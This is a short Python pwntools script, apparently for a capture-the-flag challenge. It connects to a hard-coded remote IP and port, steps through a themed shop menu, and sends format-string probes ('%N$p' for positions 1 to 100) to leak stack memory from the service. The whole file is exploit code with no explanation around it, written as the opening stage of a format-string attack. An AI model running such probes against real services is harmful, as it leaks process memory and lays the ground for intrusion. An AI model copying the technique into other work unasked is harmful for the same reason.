from pwn import *

context.log_level = 'debug'

def detect(io):
	for i in range(100):
		if i == 9:
			continue
		svar = '%'+str(i+1)+'$p'
		io.recvuntil('2. Space food')
		io.sendline(b'1')
		io.recvuntil('3. Deathstar(70.00 s.rocks)')
		io.sendline(b'2')
		io.recvuntil('Red or Green Kryptonite?')
		io.sendline(svar.encode())

ip, port = '142.93.34.45', 30123
io = remote(ip, port)

detect(io)
